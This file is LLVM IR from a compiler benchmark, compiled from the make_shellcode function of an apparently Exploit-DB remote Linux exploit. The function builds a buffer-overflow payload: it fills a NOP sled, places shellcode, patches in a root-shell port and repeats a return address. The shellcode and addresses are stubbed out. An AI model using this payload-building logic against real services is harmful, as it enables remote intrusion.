; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22454.c_make_shellcode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22454.c_make_shellcode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@sc = common dso_local global i64 0, align 8
@BUF_SIZE = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [3 x i8] c"XX\00", align 1
@root_shell_port = common dso_local global i32 0, align 4
@RET_ADDR = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @make_shellcode(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %5 = load i64, i64* @sc, align 8
  %6 = load i32, i32* @BUF_SIZE, align 4
  %7 = call i32 @memset(i64 %5, i32 144, i32 %6)
  %8 = load i64, i64* @sc, align 8
  %9 = load i32, i32* @BUF_SIZE, align 4
  %10 = sext i32 %9 to i64
  %11 = add nsw i64 %8, %10
  %12 = load i32, i32* @shellcode, align 4
  %13 = call i64 @strlen(i32 %12)
  %14 = add nsw i64 %13, 1
  %15 = sub nsw i64 %11, %14
  %16 = load i32, i32* @shellcode, align 4
  %17 = load i32, i32* @shellcode, align 4
  %18 = call i64 @strlen(i32 %17)
  %19 = call i32 @memcpy(i64 %15, i32 %16, i64 %18)
  %20 = load i64, i64* @sc, align 8
  %21 = call i8* @strstr(i64 %20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  store i8* %21, i8** %3, align 8
  %22 = load i32, i32* @root_shell_port, align 4
  %23 = call i32 @htons(i32 %22)
  %24 = and i32 %23, 255
  %25 = trunc i32 %24 to i8
  %26 = load i8*, i8** %3, align 8
  %27 = getelementptr inbounds i8, i8* %26, i32 1
  store i8* %27, i8** %3, align 8
  store i8 %25, i8* %26, align 1
  %28 = load i32, i32* @root_shell_port, align 4
  %29 = call i32 @htons(i32 %28)
  %30 = ashr i32 %29, 8
  %31 = and i32 %30, 255
  %32 = trunc i32 %31 to i8
  %33 = load i8*, i8** %3, align 8
  store i8 %32, i8* %33, align 1
  %34 = load i64, i64* @sc, align 8
  %35 = inttoptr i64 %34 to i8*
  %36 = load i32, i32* @BUF_SIZE, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  store i8* %38, i8** %3, align 8
  store i32 0, i32* %4, align 4
  br label %39

39:                                               ; preds = %95, %1
  %40 = load i32, i32* %4, align 4
  %41 = load i32, i32* @BUF_SIZE, align 4
  %42 = sub nsw i32 %41, 4
  %43 = icmp slt i32 %40, %42
  br i1 %43, label %44, label %98

44:                                               ; preds = %39
  %45 = load i32, i32* %2, align 4
  switch i32 %45, label %94 [
    i32 0, label %46
    i32 1, label %70
  ]

46:                                               ; preds = %44
  %47 = load i32, i32* @RET_ADDR, align 4
  %48 = and i32 %47, 255
  %49 = trunc i32 %48 to i8
  %50 = load i8*, i8** %3, align 8
  %51 = getelementptr inbounds i8, i8* %50, i32 1
  store i8* %51, i8** %3, align 8
  store i8 %49, i8* %50, align 1
  %52 = load i32, i32* @RET_ADDR, align 4
  %53 = ashr i32 %52, 8
  %54 = and i32 %53, 255
  %55 = trunc i32 %54 to i8
  %56 = load i8*, i8** %3, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %3, align 8
  store i8 %55, i8* %56, align 1
  %58 = load i32, i32* @RET_ADDR, align 4
  %59 = ashr i32 %58, 16
  %60 = and i32 %59, 255
  %61 = trunc i32 %60 to i8
  %62 = load i8*, i8** %3, align 8
  %63 = getelementptr inbounds i8, i8* %62, i32 1
  store i8* %63, i8** %3, align 8
  store i8 %61, i8* %62, align 1
  %64 = load i32, i32* @RET_ADDR, align 4
  %65 = ashr i32 %64, 24
  %66 = and i32 %65, 255
  %67 = trunc i32 %66 to i8
  %68 = load i8*, i8** %3, align 8
  %69 = getelementptr inbounds i8, i8* %68, i32 1
  store i8* %69, i8** %3, align 8
  store i8 %67, i8* %68, align 1
  br label %94

70:                                               ; preds = %44
  %71 = load i32, i32* @RET_ADDR, align 4
  %72 = ashr i32 %71, 16
  %73 = and i32 %72, 255
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %3, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %3, align 8
  store i8 %74, i8* %75, align 1
  %77 = load i32, i32* @RET_ADDR, align 4
  %78 = ashr i32 %77, 24
  %79 = and i32 %78, 255
  %80 = trunc i32 %79 to i8
  %81 = load i8*, i8** %3, align 8
  %82 = getelementptr inbounds i8, i8* %81, i32 1
  store i8* %82, i8** %3, align 8
  store i8 %80, i8* %81, align 1
  %83 = load i32, i32* @RET_ADDR, align 4
  %84 = and i32 %83, 255
  %85 = trunc i32 %84 to i8
  %86 = load i8*, i8** %3, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %3, align 8
  store i8 %85, i8* %86, align 1
  %88 = load i32, i32* @RET_ADDR, align 4
  %89 = ashr i32 %88, 8
  %90 = and i32 %89, 255
  %91 = trunc i32 %90 to i8
  %92 = load i8*, i8** %3, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %3, align 8
  store i8 %91, i8* %92, align 1
  br label %94

94:                                               ; preds = %44, %70, %46
  br label %95

95:                                               ; preds = %94
  %96 = load i32, i32* %4, align 4
  %97 = add nsw i32 %96, 4
  store i32 %97, i32* %4, align 4
  br label %39

98:                                               ; preds = %39
  %99 = load i8*, i8** %3, align 8
  store i8 0, i8* %99, align 1
  ret void
}

declare dso_local i32 @memset(i64, i32, i32) #1

declare dso_local i32 @memcpy(i64, i32, i64) #1

declare dso_local i64 @strlen(i32) #1

declare dso_local i8* @strstr(i64, i8*) #1

declare dso_local i32 @htons(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
